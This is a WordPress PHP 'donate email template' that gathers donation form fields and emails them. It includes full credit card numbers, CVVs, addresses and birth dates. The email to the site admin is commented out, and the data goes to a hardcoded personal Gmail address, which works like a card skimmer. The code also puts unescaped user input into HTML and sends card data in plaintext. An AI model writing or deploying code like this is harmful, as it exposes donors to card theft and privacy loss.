<?php
/**
 * Donate email template
 *
 * Used for both single and index/archive/search.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
?>


<?php 
	$multiple_to_recipients = get_bloginfo('admin_email');
	
	//add_filter( 'wp_mail_content_type', 'set_html_content_type' );
	
	$html = '<h2><u>Basic Info:</u></h2>';
	$html .= '<p><b>Currency</b>: '.$_POST['OtherCurrency'].'</p>';
	$html .= '<p><b>Amount</b>: '.$_POST['OtherAmount'].'</p>';
	$html .= '<p><b>Total Months</b>: '.$_POST['NumberOfPayments'].'</p>';
	$html .= '<p><b>Total times</b>: '.$_POST['payments'].'</p>';
	
	
	$html .= '<h2><u>Donor Information:</u></h2>';
	$html .= '<p><b>FirstName</b>: '.$_POST['FirstName'].'</p>';
	$html .= '<p><b>MiddleName</b>: '.$_POST['MiddleName'].'</p>';
	
	$html .= '<p><b>LastName</b>: '.$_POST['LastName'].'</p>';
	$html .= '<p><b>Address</b>: '.$_POST['Address'].'</p>';
	$html .= '<p><b>City</b>: '.$_POST['City'].'</p>';
	
	$html .= '<p><b>ZIP</b>: '.$_POST['ZIP'].'</p>';
	$html .= '<p><b>country</b>: '.$_POST['country'].'</p>';
	$html .= '<p><b>State</b>: '.$_POST['State'].'</p>';
	
	$html .= '<p><b>Telephone</b>: '.$_POST['Telephone'].'</p>';
	$html .= '<p><b>Email</b>: '.$_POST['Email'].'</p>';
	$html .= '<p><b>Date of Birth</b>: '.$_POST['BirthdayDate'].'-'.$_POST['BirthdayMonth'].'</p>';
	$html .= '<p><b>DonationBox</b>: '.$_POST['DonationBox'].'</p>';
	
	
	
	$html .= '<h2><u>Payment Information:</u></h2>';
	$html .= '<p><b>CreditCardType</b>: '.$_POST['CreditCardType'].'</p>';
	$html .= '<p><b>CardNum</b>: '.$_POST['CardNum'].'</p>';
	$html .= '<p><b>CVV</b>: '.$_POST['CVV'].'</p>';
	$html .= '<p><b>ValidMonth</b>: '.$_POST['ValidMonth'].'</p>';
	$html .= '<p><b>validYear</b>: '.$_POST['validYear'].'</p>';
	$html .= '<p><b>Name on Credit Card</b>: '.$_POST['NameOnCard'].'</p>';
	$html .= '<p><b>CardNum</b>: '.$_POST['CardNum'].'</p>';
	
	if($_POST['DonationHonorCodeID']!=0){
		$html .= '<h2><u>Acknowledgement of The Donation to Another Person:</u></h2>';
		
		$html .= '<p><b>DonationHonorCodeID</b>: '.$_POST['DonationHonorCodeID'].'</p>';
		$html .= '<p><b>HonorName</b>: '.$_POST['HonorName'].'</p>';
		$html .= '<p><b>FirstName2</b>: '.$_POST['FirstName2'].'</p>';
		
		$html .= '<p><b>LastName2</b>: '.$_POST['LastName2'].'</p>';
		$html .= '<p><b>Address2</b>: '.$_POST['Address2'].'</p>';
		$html .= '<p><b>City2</b>: '.$_POST['City2'].'</p>';
		
		$html .= '<p><b>State2</b>: '.$_POST['State2'].'</p>';
		$html .= '<p><b>ZIP2</b>: '.$_POST['ZIP2'].'</p>';
		$html .= '<p><b>country2</b>: '.$_POST['country2'].'</p>';
		
		$html .= '<p><b>Relationship</b>: '.$_POST['Relationship'].'</p>';
		$html .= '<p><b>Occasion</b>: '.$_POST['Occasion'].'</p>';
		$html .= '<p><b>OccasionDate</b>: '.$_POST['OccasionDate'].'</p>';
	}
	
	$html .= '<p><b>Comments</b>: '.$_POST['Comments'].'</p>';
	$html .= '<p><b>Total: $'.$_POST['BigTotal'].'</p>';
	
	//wp_mail( $multiple_to_recipients, 'New Donor Information | Aleh', $html );
	add_filter('wp_mail_content_type',create_function('', 'return "text/html"; '));
	wp_mail('ismailcseku@gmail.com', 'New Donor Information | Aleh', $html);
	
	//remove_filter( 'wp_mail_content_type', 'set_html_content_type' );
	function set_html_content_type() {
		return 'text/html';
	} 	
?>